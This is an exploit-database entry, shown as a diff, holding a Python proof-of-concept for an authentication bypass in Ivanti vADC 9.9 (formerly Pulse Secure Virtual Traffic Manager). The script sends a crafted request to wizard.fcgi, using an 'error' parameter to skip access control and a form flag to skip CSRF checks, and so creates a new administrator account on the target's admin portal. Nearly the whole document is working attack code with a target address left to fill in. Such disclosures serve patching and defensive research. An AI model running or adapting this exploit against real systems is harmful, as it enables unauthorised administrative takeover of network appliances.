@@ -1,0 +1,55 @@
+id: 39693
+date: 08/04/2024
+title: Ivanti vADC 9.9 - Authentication Bypass Exploit
+author: ohnoisploited
+cves: 
+
+# Exploit Title: Ivanti vADC 9.9 - Authentication Bypass
+# Exploit Author: ohnoisploited
+# Vendor Homepage: https://www.ivanti.com/en-gb/products/virtual-application-delivery-controller
+# Software Link: https://hubgw.docker.com/r/pulsesecure/vtm
+# Version: 9.9
+# Tested on: Linux
+# Name Changes: Riverbed Stringray Traffic Manager -> Brocade vTM -> Pulse Secure Virtual Traffic Manager -> Ivanti vADC 
+# Fixed versions: 22.7R2+
+
+import requests
+
+# Set to target address
+admin_portal = 'https://192.168.88.130:9090'
+
+# User to create
+new_admin_name = 'newadmin'
+new_admin_password = 'newadmin1234'
+
+requests.packages.urllib3.disable_warnings() 
+session = requests.Session()
+
+# Setting 'error' bypasses access control for wizard.fcgi.
+# wizard.fcgi can load any section in the web interface.
+params = { 'error': 1,
+          'section': 'Access Management:LocalUsers' }
+
+# Create new user request
+# _form_submitted to bypass CSRF
+data = {  '_form_submitted': 'form',
+          'create_user': 'Create',
+          'group': 'admin',
+          'newusername': new_admin_name,
+          'password1': new_admin_password,
+          'password2': new_admin_password }
+
+# Post request
+r = session.post(admin_portal + "/apps/zxtm/wizard.fcgi", params=params, data=data, verify=False, allow_redirects=False)
+
+# View response
+content = r.content.decode('utf-8')
+print(content)
+
+if r.status_code == 200 and '<title>2<' in content:
+    print("New user request sent")
+    print("Login with username '" + new_admin_name + "' and password '" + new_admin_password + "'")
+else:
+    print("Unable to create new user")
+
+#  0day.today [2024-08-12]  #
